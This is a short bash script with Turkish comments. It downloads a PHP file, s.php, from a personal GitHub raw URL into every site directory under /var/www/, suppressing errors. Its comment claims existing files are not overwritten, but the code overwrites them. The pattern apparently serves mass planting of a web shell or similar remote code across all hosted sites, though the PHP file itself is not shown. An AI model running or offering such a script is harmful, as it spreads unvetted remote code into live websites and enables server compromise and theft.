#!/bin/bash

# Bu betik /var/www/ dizinindeki her dizine s.php dosyasını indirir.

# /var/www/ dizinindeki tüm dizinleri dolaş
for dir in /var/www/*/; do
    # İndirilecek dosyanın URL'si
    url="https://raw.githubusercontent.com/berkaybasar/berkaybasar.github.io/main/s.php"

    # Dosyanın indirileceği hedef yol
    target="$dir/s.php"

    # Dosya zaten varsa üzerine yazma
    wget -O "$target" "$url" 2>/dev/null || curl -o "$target" "$url" 2>/dev/null

    # İşlem sonucunu kontrol et
    if [ $? -eq 0 ]; then
        echo "s.php dosyası başarıyla $dir dizinine indirildi."
    else
        echo "s.php dosyası $dir dizinine indirilirken bir hata oluştu."
    fi
done
